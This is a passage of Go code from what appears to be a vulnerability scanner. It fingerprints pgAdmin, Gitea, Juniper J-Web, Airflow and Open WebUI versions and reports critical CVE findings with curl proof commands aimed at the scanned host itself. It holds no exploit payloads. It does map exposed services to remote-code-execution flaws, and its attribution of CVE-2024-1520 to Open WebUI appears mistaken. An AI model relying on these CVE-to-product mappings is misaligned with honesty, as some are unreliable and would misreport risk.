	// Earlier major versions are all affected.
	if maj < 6 {
		return true
	}
	return false
}

// probePgAdminValidateRCE tests for CVE-2024-3116 (pgAdmin ≤ 8.4 validate
// binary path API → OS command injection RCE, EPSS 90.7%). pgAdmin exposes
// its version in the page source or /misc/ping endpoint.
func probePgAdminValidateRCE(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	// Try /misc/ping first — pgAdmin-specific endpoint.
	u := base + "/misc/ping"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 2048))
	resp.Body.Close()

	var ver string
	if resp.StatusCode == http.StatusOK {
		bodyStr := string(body)
		// pgAdmin /misc/ping may return {"alive": true} or version info.
		ver = parseJSONField(bodyStr, "version")
	}

	// If no version from /misc/ping, check the root page.
	if ver == "" {
		rootReq, err2 := http.NewRequestWithContext(ctx, http.MethodGet, base+"/", nil)
		if err2 == nil {
			if rootResp, err3 := client.Do(rootReq); err3 == nil {
				rootBody, _ := io.ReadAll(io.LimitReader(rootResp.Body, 8192))
				rootResp.Body.Close()
				// Page source contains pgadmin4==X.Y or VERSION = 'X.Y'
				rootStr := string(rootBody)
				if strings.Contains(strings.ToLower(rootStr), "pgadmin") {
					// Try to extract version from page title or meta.
					ver = extractPgAdminVersion(rootStr)
				}
			}
		}
	}
	if ver == "" {
		return nil
	}
	if !isPgAdminValidateRCEVulnerable(ver) {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVEpgAdminValidateRCE,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Title:    fmt.Sprintf("CVE-2024-3116: pgAdmin %s validate binary path RCE on %s", ver, asset),
		Description: fmt.Sprintf(
			"%s is running pgAdmin %s which is vulnerable to CVE-2024-3116 (EPSS 90.7%%). "+
				"The 'validate binary path' API endpoint (/validate/binary_path or similar) "+
				"allows authenticated users to execute arbitrary OS commands on the pgAdmin server. "+
				"Affects pgAdmin 4 ≤ 8.4. Upgrade to pgAdmin 8.5 or later immediately "+
				"and restrict access to trusted networks.",
			asset, ver,
		),
		Asset: asset,
		Evidence: map[string]any{
			"url":     u,
			"version": ver,
		},
		ProofCommand: fmt.Sprintf("curl -sk '%s' | jq .", u),
		DiscoveredAt: time.Now(),
	}
}

func extractPgAdminVersion(body string) string {
	// Look for pgadmin4==X.Y or VERSION = 'X.Y' patterns.
	lower := strings.ToLower(body)
	if idx := strings.Index(lower, "pgadmin4=="); idx != -1 {
		rest := body[idx+len("pgadmin4=="):]
		end := strings.IndexAny(rest, `"' <>\n\r`)
		if end > 0 {
			return rest[:end]
		}
	}
	return ""
}

func isPgAdminValidateRCEVulnerable(ver string) bool {
	parts := strings.SplitN(ver, ".", 2)
	if len(parts) < 1 {
		return false
	}
	maj := 0
	fmt.Sscanf(parts[0], "%d", &maj)
	// Affected: pgAdmin 4 ≤ 8.4. Since "8.4" means major version 8 minor 4,
	// we check if the version string parses to 8.4 or below.
	if maj < 8 {
		return true
	}
	if maj == 8 && len(parts) == 2 {
		minPatch := 0
		fmt.Sscanf(parts[1], "%d", &minPatch)
		return minPatch <= 4
	}
	return false
}

// probeGiteaCMDInjection tests for CVE-2022-30781 (Gitea < 1.16.7 shell command
// injection in repository management, CVSS 9.8). Gitea exposes its version at
// /api/v1/version unauthenticated.
func probeGiteaCMDInjection(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	u := base + "/api/v1/version"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1024))
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil
	}
	bodyStr := string(body)
	// {"version":"1.x.x"} — Gitea-specific JSON structure.
	ver := parseJSONField(bodyStr, "version")
	if ver == "" {
		return nil
	}
	if !isGiteaCMDInjectionVulnerable(ver) {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVEGiteaCMDInjection,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Title:    fmt.Sprintf("CVE-2022-30781: Gitea %s shell command injection on %s", ver, asset),
		Description: fmt.Sprintf(
			"%s is running Gitea %s which is vulnerable to CVE-2022-30781 (CVSS 9.8). "+
				"Shell command injection in the repository management API allows authenticated "+
				"users (including those with repo access) to execute arbitrary OS commands. "+
				"Affects Gitea < 1.16.7. Upgrade to Gitea 1.16.7 or later immediately.",
			asset, ver,
		),
		Asset: asset,
		Evidence: map[string]any{
			"url":     u,
			"version": ver,
		},
		ProofCommand: fmt.Sprintf("curl -sk '%s' | jq .version", u),
		DiscoveredAt: time.Now(),
	}
}

// isGiteaCMDInjectionVulnerable returns true for Gitea < 1.16.7.
func isGiteaCMDInjectionVulnerable(ver string) bool {
	// Strip leading 'v' if present.
	ver = strings.TrimPrefix(ver, "v")
	parts := strings.SplitN(ver, ".", 3)
	if len(parts) < 2 {
		return false
	}
	maj, min, patch := 0, 0, 0
	fmt.Sscanf(parts[0], "%d", &maj)
	fmt.Sscanf(parts[1], "%d", &min)
	if len(parts) == 3 {
		fmt.Sscanf(parts[2], "%d", &patch)
	}
	if maj < 1 {
		return true
	}
	if maj == 1 && min < 16 {
		return true
	}
	if maj == 1 && min == 16 && patch < 7 {
		return true
	}
	return false
}

// probeJuniperJWeb2024 tests for CVE-2024-21591 (CVSS 9.8, KEV) — a type confusion
// vulnerability in Juniper Junos OS J-Web < 23.4R1 allowing unauthenticated RCE as root.
// The probe confirms J-Web presence via /webauth_operation.php (same fingerprint as
// CVE-2023-36844) — any exposed J-Web instance may be affected if unpatched.
func probeJuniperJWeb2024(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	u := base + "/webauth_operation.php"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 2048))
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil
	}
	if !strings.Contains(string(body), "Juniper") {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVEJuniperJWeb2024,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Asset:    asset,
		Title:    fmt.Sprintf("CVE-2024-21591: Juniper J-Web exposed — pre-auth RCE risk on %s", asset),
		Description: "A Juniper J-Web interface is publicly accessible. CVE-2024-21591 (CVSS 9.8, KEV) " +
			"is a type confusion vulnerability in Junos OS J-Web affecting versions before 23.4R1. " +
			"An unauthenticated attacker can achieve remote code execution as root or perform a " +
			"denial of service by sending crafted HTTP requests. Affected platforms include SRX, EX, " +
			"MX, and ACX series running Junos OS. " +
			"Upgrade to Junos OS 20.4R3-S9, 21.2R3-S7, 21.4R3-S5, 22.2R3-S3, 22.3R3-S2, " +
			"22.4R2-S2/R3, 23.2R1-S1/R2, 23.4R1 or later, or disable J-Web.",
		Evidence: map[string]any{
			"url":        u,
			"body_match": "Juniper",
		},
		ProofCommand: fmt.Sprintf(
			"curl -s '%s' | grep -i juniper\n"+
				"# Exposed J-Web — verify Junos version is >= 23.4R1 to confirm patch", u),
		DiscoveredAt: time.Now(),
	}
}

// probeApacheAirflow tests for an exposed Apache Airflow web server and checks for
// CVE-2024-39877 (CVSS 8.8) — DAG author code execution via malicious Python DAG files.
// Affects Airflow < 2.10.0. The /api/v1/health endpoint confirms Airflow; /api/v1/version
// reveals the version. Both endpoints are unauthenticated by default in many deployments.
func probeApacheAirflow(ctx context.Context, client *http.Client, base, asset string) []finding.Finding {
	healthURL := base + "/api/v1/health"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, healthURL, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 2048))
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil
	}
	bodyStr := strings.ToLower(string(body))
	// Airflow health response contains "scheduler" and "metadatabase" keys.
	if !strings.Contains(bodyStr, "scheduler") || !strings.Contains(bodyStr, "metadatabase") {
		return nil
	}
	var findings []finding.Finding
	findings = append(findings, finding.Finding{
		CheckID:  finding.CheckPortAirflowExposed,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityHigh,
		Asset:    asset,
		Title:    fmt.Sprintf("Apache Airflow web server exposed unauthenticated on %s", asset),
		Description: "The Apache Airflow REST API health endpoint at /api/v1/health responded " +
			"without authentication, indicating the Airflow web server is publicly accessible. " +
			"Airflow orchestrates sensitive data pipelines and DAG execution. " +
			"Unauthenticated access can expose pipeline configuration, credentials, and connection strings. " +
			"Restrict Airflow to internal networks or enable authentication.",
		Evidence: map[string]any{
			"url":  healthURL,
			"body": string(body)[:min(len(string(body)), 256)],
		},
		ProofCommand: fmt.Sprintf(
			"curl -s '%s'\n# Expected: JSON with scheduler/metadatabase health fields", healthURL),
		DiscoveredAt: time.Now(),
	})
	// Fetch version to check CVE-2024-39877.
	verURL := base + "/api/v1/version"
	vreq, err := http.NewRequestWithContext(ctx, http.MethodGet, verURL, nil)
	if err != nil {
		return findings
	}
	vresp, err := client.Do(vreq)
	if err != nil {
		return findings
	}
	vbody, _ := io.ReadAll(io.LimitReader(vresp.Body, 512))
	vresp.Body.Close()
	if vresp.StatusCode != http.StatusOK {
		return findings
	}
	ver := parseJSONField(string(vbody), "version")
	if ver == "" {
		return findings
	}
	if isAirflowDAGRCEVulnerable(ver) {
		findings = append(findings, finding.Finding{
			CheckID:  finding.CheckCVEAirflowDAGRCE,
			Module:   "surface",
			Scanner:  scannerName,
			Severity: finding.SeverityHigh,
			Asset:    asset,
			Title:    fmt.Sprintf("CVE-2024-39877: Apache Airflow %s vulnerable to DAG code execution on %s", ver, asset),
			Description: fmt.Sprintf(
				"%s is running Apache Airflow %s which is vulnerable to CVE-2024-39877 (CVSS 8.8). "+
					"A DAG author can execute arbitrary code on the Airflow worker by crafting a malicious DAG file. "+
					"This affects Airflow < 2.10.0. Upgrade to Apache Airflow 2.10.0 or later.",
				asset, ver,
			),
			Evidence: map[string]any{
				"url":     verURL,
				"version": ver,
			},
			ProofCommand: fmt.Sprintf("curl -s '%s' | jq .version", verURL),
			DiscoveredAt: time.Now(),
		})
	}
	return findings
}

// isAirflowDAGRCEVulnerable returns true for Apache Airflow < 2.10.0.
func isAirflowDAGRCEVulnerable(ver string) bool {
	ver = strings.TrimPrefix(ver, "v")
	parts := strings.SplitN(ver, ".", 3)
	if len(parts) < 2 {
		return false
	}
	maj, min := 0, 0
	fmt.Sscanf(parts[0], "%d", &maj)
	fmt.Sscanf(parts[1], "%d", &min)
	if maj < 2 {
		return true
	}
	if maj == 2 && min < 10 {
		return true
	}
	return false
}

// probeOpenWebUI tests for an exposed Open WebUI instance (CVE-2024-1520).
// CVE-2024-1520 is an OS command injection vulnerability via the /open_code_folder endpoint.
// The probe checks the root page for "Open WebUI" in the title — product-unique fingerprint.
func probeOpenWebUI(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	u := base + "/"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil
	}
	bodyStr := strings.ToLower(string(body))
	// "open webui" appears in <title> and meta tags — sufficiently product-specific.
	if !strings.Contains(bodyStr, "open webui") {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckPortOpenWebUIExposed,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityHigh,
		Asset:    asset,
		Title:    fmt.Sprintf("Open WebUI exposed on %s — CVE-2024-1520 OS command injection risk", asset),
		Description: "An Open WebUI instance is publicly accessible on this host. " +
			"CVE-2024-1520 is an OS command injection vulnerability in Open WebUI's /open_code_folder endpoint " +
			"that allows authenticated users to execute arbitrary OS commands on the server. " +
			"Exposing Open WebUI publicly increases the attack surface significantly. " +
			"Restrict access to trusted users or internal networks and ensure the instance is fully patched.",
		Evidence: map[string]any{
			"url":        u,
			"body_match": "open webui",
		},
		ProofCommand: fmt.Sprintf(
			"curl -s '%s' | grep -i 'open webui'\n# Expected: title or meta content matching 'Open WebUI'", u),
		DiscoveredAt: time.Now(),
	}
}

func detectScheme(ctx context.Context, client *http.Client, asset string) string {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, "https://"+asset, nil)
	if err != nil {
		return "http"
	}
	resp, err := client.Do(req)
	if err != nil {
		return "http"
	}
	resp.Body.Close()
	return "https"
}
